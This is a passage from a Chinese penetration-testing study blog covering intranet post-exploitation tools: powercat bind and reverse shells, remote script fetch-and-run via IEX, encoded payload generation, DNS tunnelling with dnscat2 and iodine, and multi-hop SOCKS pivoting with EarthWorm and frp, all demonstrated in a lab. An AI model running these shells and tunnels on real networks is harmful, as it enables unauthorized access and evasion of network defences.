powercat</h2><p>powercat 可以视为 nc 的 powershell 版本，因此也可以和 nc 进行连接。</p><p>powercat 可在 github 进行下载，项目地址为：<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><p>下载下来 powercat.ps1 文件后，直接导入即可</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\powercat.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果提示未能加载指定模块，则可能是权限问题，可以参照之前写的 <a href="https://teamssix.com/year/210206-191859.html">【内网学习笔记】2、PowerShell</a> 文章中的方法对其赋予权限，即在管理员模式下运行以下命令</p><pre class="line-numbers language-none"><code class="language-none">Set-ExecutionPolicy Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以导入 powercat 了，导入成功后，输入 powercat -h 可以看到帮助信息。</p><p>如果没有权限，也可以直接下载远程文件进行绕过。</p><pre class="line-numbers language-none"><code class="language-none">IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过由于 github 在国内可能会无法打开，因此可以使用 web 代理站点或者把 powercat.ps1 文件放到自己的服务器上进行下载。</p><h2 id="2、powercat-的使用"><a href="#2、powercat-的使用" class="headerlink" title="2、powercat 的使用"></a>2、powercat 的使用</h2><p>powercat 命令参数</p><pre class="line-numbers language-none"><code class="language-none">-l监听模式-p指定监听端口-e指定启动进程的名称-v显示详情-c指定想要连接的 IP 地址-ep返回 powershell-dns使用 dns 通信-g生成 payload-ge生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到和 nc 的命令还是很相似的。</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>Kali 上的 nc 连接到靶机</p><pre class="line-numbers language-none"><code class="language-none">nc -v rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">nc -v 172.16.214.21 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机开启监听，等待 Kali 连接</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p lport -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>Kali 上开启监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机向 kali 发起连接</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.46 -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="返回-powershell"><a href="#返回-powershell" class="headerlink" title="返回 powershell"></a>返回 powershell</h3><p>攻击机上运行</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p lport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机上运行</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.21 -p 4444 -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="作为跳板使用"><a href="#作为跳板使用" class="headerlink" title="作为跳板使用"></a>作为跳板使用</h3><p>测试环境为：</p><pre class="line-numbers language-none"><code class="language-none">kali172.16.214.47windows7172.16.214.2windows10172.16.214.21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将 win7 作为跳板机，让 kali 通过 win7 连接到 windows10</p><p>在 win10 中执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 win7 中执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 5555 -r tcp:172.16.214.21:4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后在 kali 下连接 win7</p><pre class="line-numbers language-none"><code class="language-none">nc -v 172.16.214.2 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-01_14-23-47.png"></p><h3 id="powercat-生成-payload"><a href="#powercat-生成-payload" class="headerlink" title="powercat 生成 payload"></a>powercat 生成 payload</h3><p>在攻击机上运行以下命令生成 shell.ps1 payload 文件</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -e cmd -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 shell.ps1 文件拷贝到目标主机上后，执行 shell.ps1 文件</p><p>之后在攻击机上运行以下命令即可获得 shell</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.21 -p 4444 -v <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反向连接也可以</p><p>在攻击机上生成 ps1 文件，并开启监听</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -ep -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.2 -p 4444 -ep -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后在靶机上，运行 ps1 文件就会上线了，如果不想生成文件，也可以使用 -ge 生成经过编码的 payload</p><p>在攻击机上生成 payload，并开启监听</p><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.2 -p 4444 -ep -ge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在靶机上执行刚生成的 payload</p><pre class="line-numbers language-none"><code class="language-none">powershell -e payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-01_15-35-24.png"></p><h3 id="建立-dns-隧道连接"><a href="#建立-dns-隧道连接" class="headerlink" title="建立 dns 隧道连接"></a>建立 dns 隧道连接</h3><p>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。</p><p>在服务端上安装 dnscat ，以 kali 为例</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.gitcd dnscat2&#x2F;server&#x2F;gem install bundlerbundle install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>命令运行完之后，执行以下命令开启服务端</p><pre class="line-numbers language-none"><code class="language-none">ruby dnscat2.rb powercat -e open --no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在靶机下，执行以下命令，建立 dns 隧道</p><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.47 -p 53 -dns powercat -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，在 kali 上就能看到回连的会话了</p><pre class="line-numbers language-none"><code class="language-none">sessions#查看所有会话session -i 1 #选择指定的会话进行交互<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不过实测，虽然能返回会话，但不能执行命令，暂不清楚原因是什么。</p><p>powercat 暂时就记录这些，其他的比如文件传输什么的就不记了，毕竟使用频率几乎为零，平时使用最多的可能还是拿它来反弹 shell，不过为什么不用 CS 或者 MSF 呢，不更香嘛。</p><h1 id="0x09-iodine-使用"><a href="#0x09-iodine-使用" class="headerlink" title="0x09 iodine 使用"></a>0x09 iodine 使用</h1><h2 id="1、介绍-3"><a href="#1、介绍-3" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口号。 </p><p>iodine 和 dnscat2 一样，适合于其他请求方式被限制以至于只能发送 DNS 请求的环境中，iodine 同样也是分成了直接转发和中继两种模式。</p><p>iodine 与 dnscat2 不同的在于 Iodine 服务端和客户端都是用 C 语言开发，同时 iodine 的原理也有些不同，iodine 通过 TAP 在服务端和客户端分别建立一个局域网和虚拟网卡，再通过 DNS 隧道进行连接，然后使其处在同一个局域网中。</p><h2 id="2、安装-1"><a href="#2、安装-1" class="headerlink" title="2、安装"></a>2、安装</h2><p>首先需要有一个域名，并设置 NS 和 A 记录，A 记录指向自己的公网 VPS 地址，NS 记录指向 A 记录的子域名。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-07_17-20-20.png"></p><p>Kali 下自带 iodine ，Debian Linux 可以使用 apt 进行安装</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install iodine<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Windows 可以直接到官网下载，下载地址：<a href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a>，服务端名称是 iodined.exe，客户端是 iodine.exe</p><h2 id="3、使用-1"><a href="#3、使用-1" class="headerlink" title="3、使用"></a>3、使用</h2><p>这里服务端使用的是 Linux，服务端命令如下：</p><pre class="line-numbers language-none"><code class="language-none">sudo iodined -f -c -P teamssix 192.168.77.1 dc.teamssix.com -DD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-f在前台运行-c不检查传入请求的客户端 IP 地址-P客户端与服务端之间的连接密码-D调试级别，-D 表示第一级，-DD 表示第二级，依此类推192.168.77.1 是自己自定义的局域网虚拟 IP 地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里客户端使用的是 Windows，Windows 客户端上除了要有 iodine 相关文件外，还需要安装 tap 网卡驱动程序，这里我百度找了一个下载地址 <a href="http://www.qudong51.net/qudong/981.html">http://www.qudong51.net/qudong/981.html</a></p><p>打开下载好的 tap 网卡驱动程序，一直下一步下一步安装就行。</p><p>然后就可以启动客户端程序了，注意下载下来的 dll 文件要和 exe 在一个目录下，不能只复制一个 exe 到目标主机上，而且要以管理员权限运行下面的命令。</p><pre class="line-numbers language-none"><code class="language-none">.\iodine.exe -f -r -P teamssix dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-riodine 有时会自动将 DNS 隧道切换成 UDP 通道，使用 -r 命令可以强制让 iodine 在任何情况下都使用 DNS 隧道<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果出现 <code>Connection setup complete, transmitting data.</code> 就表示 DNS 隧道就已经建立了。</p><p>这时如果去 ping 服务端自定义的虚拟 IP 也是可以 ping 通的。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-08_21-12-06.png"></p><p>假如这里内网机器分配到了 192.168.77.2 这个 IP ，因为处在一个局域网中，所以 VPS 直接访问 192.168.77.2 的 3389、80 等端口就可以直接访问到内网机器的相关端口了，同样的内网主机也可以访问 VPS 的 22 端口等等，至此便绕过了策略限制。</p><h1 id="0x10-ew-的使用"><a href="#0x10-ew-的使用" class="headerlink" title="0x10 ew 的使用"></a>0x10 ew 的使用</h1><h2 id="1、Socks-代理工具介绍"><a href="#1、Socks-代理工具介绍" class="headerlink" title="1、Socks 代理工具介绍"></a>1、Socks 代理工具介绍</h2><p>Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：</p><p><a href="https://teamssix.com/year/210528-130449.html">https://teamssix.com/year/210528-130449.html</a></p><p>但是 lcx 毕竟年代久远，现在的杀软基本也都能识别到了，因此在实战中不太推荐使用 lcx ，更推荐使用这些 socks 代理工具。</p><p>常见的 socks 代理工具有 ew、termite、frp、nps、sSocks、reGeorg、Neo-reGeorg、SocksCap、Proxifier、ProxyChains 等等，不同的工具适合使用的场景和方法都有所不同。</p><p>因为在这其中有些工具笔者较经常使用，所以这里主要记录下 ew、frp、nps 的使用方法，本篇文章主要记录 ew 的使用，后续文章将更新 frp、nps 的使用。</p><p>开始之前，先理解下正向代理和反向代理的区别。</p><blockquote><p>正向代理：主动通过代理访问目标主机，即攻击主机 –》目标主机</p><p>反向代理：目标机器通过代理进行主动连接，即目标主机 –》攻击主机</p></blockquote><h2 id="2、ew-的使用"><a href="#2、ew-的使用" class="headerlink" title="2、ew 的使用"></a>2、ew 的使用</h2><p>ew 的项目主页：<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p>ew 全称 <code>EarthWorm</code>，直译过来就是<code>蚯蚓</code>，引用作者的原话是：</p><blockquote><p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p></blockquote><p>这个描述也是很形象了。</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>作者已经不提供 ew 的下载了，但是搜了一下 github 还是有其他人上传的，不过病毒需自查。</p><p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>从这工具上传的时间是 5 年前就可以看出这个工具很有年代感了。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>该工具共有 6 种命令格式 ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran，正向连接的命令是 ssocked，反向连接的命令是 rcsocks 和 rssocks，其他命令用于一些比较复杂的网络环境中。</p><h4 id="a、正向连接"><a href="#a、正向连接" class="headerlink" title="a、正向连接"></a>a、正向连接</h4><p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。</p><p>命令也很简单</p><pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-s 设置状态模式 -l 设置监听端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 1080ssocksd 0.0.0.0:1080 &lt;--[10000 usec]--&gt; socks server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可，socks 要选择 socks5</p><h4 id="b、反向连接"><a href="#b、反向连接" class="headerlink" title="b、反向连接"></a>b、反向连接</h4><p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了，这里就直接以内网地址作为演示了。</p><p>在公网 VPS 上执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-e 设置反弹主机端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令表示将 1080 端口接收到的数据转发到 4444 端口上。</p><p>在目标主机上执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">ew -s rssocks -d vps_ip -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-d 设置反弹主机 IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s rssocks -d 172.16.214.52 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就会看到 <code>rssocks cmd_socket OK!</code> 的提示。</p><p>最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/Snipaste_2021-06-09_10-24-45.png"></p><h4 id="c、二级网络环境（一）"><a href="#c、二级网络环境（一）" class="headerlink" title="c、二级网络环境（一）"></a>c、二级网络环境（一）</h4><p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。</p><p>在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p><pre class="line-numbers language-none"><code class="language-none">内网主机A（有公网IP） --》内网主机B --》内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内网主机B上，开启正向连接代理</p><pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内网主机A上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_tran -l 1080 -f hostB_ip -g 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_tran -l 1080 -f 192.168.7.110 -g 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令表示将 1080 端口收到的代理请求转发到内网主机 B 192.168.7.110 的 4444 端口，此时就可以通过访问内网主机 A 的外网 IP 的 1080 端口访问到内网主机 B 上架设的 socks5 代理了。</p><h4 id="d、二级网络环境（二）"><a href="#d、二级网络环境（二）" class="headerlink" title="d、二级网络环境（二）"></a>d、二级网络环境（二）</h4><p>在上面的环境中，内网主机 A 有公网 IP，如果没有公网 IP 的情况下，又该怎么办呢？这时候就需要结合反向连接了，因此需要一台公网的 VPS 主机。</p><pre class="line-numbers language-none"><code class="language-none">VPS --》内网主机A --》内网主机B --》内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在公网 VPS 上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_listen -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表示将 1080 收到的 代理请求转发到 4444 端口上</p><p>在内网主机 B 上</p><pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表示开启 5555 端口的正向代理</p><p>在内网主机 A 上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表示在内网主机 A 上使用 lcx_slave 的方式，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来。</p><p>现在就可以通过 VPS 的 1080 端口访问到内网主机 A 再访问到内网主机 B ，最后访问到内网资源了。</p><h4 id="e、三级网络环境"><a href="#e、三级网络环境" class="headerlink" title="e、三级网络环境"></a>e、三级网络环境</h4><p>目前有这样的一个环境，内网主机 A 没有公网 IP 不能访问内网资源，但是可以访问外网和内网主机 B，内网主机 B 不能访问外网和内网资源，但是可以和 A、C 相互访问，内网主机 C 能访问内网资源，但是只能和内网主机 B 相互访问，因此如果想访问到内网资源就需要做三层跳板。</p><pre class="line-numbers language-none"><code class="language-none">VPS --》内网主机 A --》内网主机 B --》内网主机 C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在公网 VPS 上，将 1080 端口收到的代理请求转发到 4444 端口</p><pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内网主机 A 上，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内网主机 B 上，将 5555 端口收到的代理请求转发到 6666 端口上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 5555 -e 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s lcx_listen -l 5555 -e 6666rcsocks 0.0.0.0:5555 &lt;--[10000 usec]--&gt; 0.0.0.0:6666init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在内网主机 C 上，启动 socks5 服务，并反弹到 B 主机的 6666 端口上</p><pre class="line-numbers language-none"><code class="language-none">ew -s rssocks -d 192.168.7.110 -e 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s rssocks -d 192.168.7.110 -e 6666rssocks 192.168.7.110:6666 &lt;--[10000 usec]--&gt; socks server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>至此，socks5 代理 VPS 的 1080 端口就会访问到内网资源了。</p><p>另外还有个 ew 的升级版工具叫 termite，不过比较遗憾的是 termite 在两年前也已经暂停更新了，这里也就不再大费周章的记录它了。</p><h1 id="0x11-frp-的使用"><a href="#0x11-frp-的使用" class="headerlink" title="0x11 frp 的使用"></a>0x11 frp 的使用</h1><h2 id="1、介绍-4"><a href="#1、介绍-4" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>相较于前一篇文章介绍的 ew 的年代久远，frp 就好的多了，基本上隔几天就会发布新的版本，最新的一版更新还就在几天前。</p><p>在实战中，大家较多使用的也是 frp，frp 项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>至于下载安装直接在项目的 releases 里下载自己对应的系统版本就行。</p><h2 id="2、使用"><a href="#2、使用" class="headerlink" title="2、使用"></a>2、使用</h2><p>官方使用文档：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p><p>frp 分成服务端和客户端，分别叫 frps 和 frpc，配置文件分别对应 frps.ini 和 frpc.ini</p><blockquote><p>以下环境均为本地环境，VPS IP 为 172.16.214.52，目标主机 IP 为 192.168.7.110</p></blockquote><h3 id="a、内网端口穿透"><a href="#a、内网端口穿透" class="headerlink" title="a、内网端口穿透"></a>a、内网端口穿透</h3><p> 场景：内网主机可出网，想从公网访问内网主机的 3389 端口</p><p>在 VPS 上开启服务端，这里以 kali 为例，首先修改配置文件 frps.ini</p><pre class="line-numbers language-none"><code class="language-none">[common]bind_port &#x3D; 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后启动服务端</p><pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;frps -c frps.ini2021&#x2F;06&#x2F;09 03:45:03 [I] [root.go:200] frps uses config file: frps.ini2021&#x2F;06&#x2F;09 03:45:03 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021&#x2F;06&#x2F;09 03:45:03 [I] [root.go:209] frps started successfully<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置客户端配置文件</p><pre class="line-numbers language-none"><code class="language-none">[common]# 服务端 IPserver_addr &#x3D; vps_ip# 服务端端口server_port &#x3D; 4444[rdp]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 3389# 连接 vps 的端口remote_port &#x3D; 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini2021&#x2F;06&#x2F;09 15:50:29 [I] [service.go:304] [72904e8037a7fdf8] login to server success, get run id [72904e8037a7fdf8], server udp port [0]2021&#x2F;06&#x2F;09 15:50:29 [I] [proxy_manager.go:144] [72904e8037a7fdf8] proxy added: [rdp]2021&#x2F;06&#x2F;09 15:50:29 [I] [control.go:180] [72904e8037a7fdf8] [rdp] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，在 vps 上访问本地的 3389 端口就会访问到内网主机的 3389 端口了。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210609155435.png"></p><h3 id="b、建立-socks-代理"><a href="#b、建立-socks-代理" class="headerlink" title="b、建立 socks 代理"></a>b、建立 socks 代理</h3><p>场景：内网主机可出网，想把内网主机作为跳板机使用</p><p>上面的场景只是利用 frp 访问了内网指定机器的指定端口，我们还可以利用 frp 将内网主机作为跳板机使用。</p><p>这次我们用上 frp 的 web 控制面板以及访问密码等功能，让我们建立的连接更加安全、方便。</p><p>在 VPS 上开启服务端，服务端配置文件如下：</p><pre class="line-numbers language-none"><code class="language-none">[common]bind_port &#x3D; 4444# 客户端认证 tokentoken &#x3D; 123456# 设置 frps 仪表盘端口、账号和密码，实战中用处貌似不大，但如果设置一定要设置强密码dashboard_port &#x3D; 8000dashboard_user &#x3D; admindashboard_pwd &#x3D; password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>实战中，为了更好的隐藏自己，最好还是要设置通过域名访问</p></blockquote><p>配置好文件后，启动服务端</p><pre class="line-numbers language-none"><code class="language-none">frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">.&#x2F;frps -c frps.ini2021&#x2F;06&#x2F;09 04:06:34 [I] [root.go:200] frps uses config file: frps.ini2021&#x2F;06&#x2F;09 04:06:35 [I] [service.go:192] frps tcp listen on 0.0.0.0:44442021&#x2F;06&#x2F;09 04:06:35 [I] [service.go:294] Dashboard listen on 0.0.0.0:80002021&#x2F;06&#x2F;09 04:06:35 [I] [root.go:209] frps started successfully<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置客户端文件</p><pre class="line-numbers language-none"><code class="language-none">[common]server_addr &#x3D; vps_ipserver_port &#x3D; 4444# 客户端认证 token，需要和服务端 token 保持一致token &#x3D; 123456# 启用加密，防止流量被拦截use_encryption &#x3D; true# 启用压缩，提升流量转发速度use_compression &#x3D; true[socks5]type &#x3D; tcp# 连接 vps 的端口remote_port &#x3D; 1080plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启客户端</p><pre class="line-numbers language-none"><code class="language-none">frpc -c frpc.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\frpc.exe -c frpc.ini2021&#x2F;06&#x2F;09 16:11:21 [I] [service.go:304] [ee7ad330ab4e6036] login to server success, get run id [ee7ad330ab4e6036], server udp port [0]2021&#x2F;06&#x2F;09 16:11:21 [I] [proxy_manager.go:144] [ee7ad330ab4e6036] proxy added: [socks5]2021&#x2F;06&#x2F;09 16:11:21 [I] [control.go:180] [ee7ad330ab4e6036] [socks5] start proxy success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>测试 VPS IP 的 1080 的 socks5 代理，发现已经连通了。</p><p><img 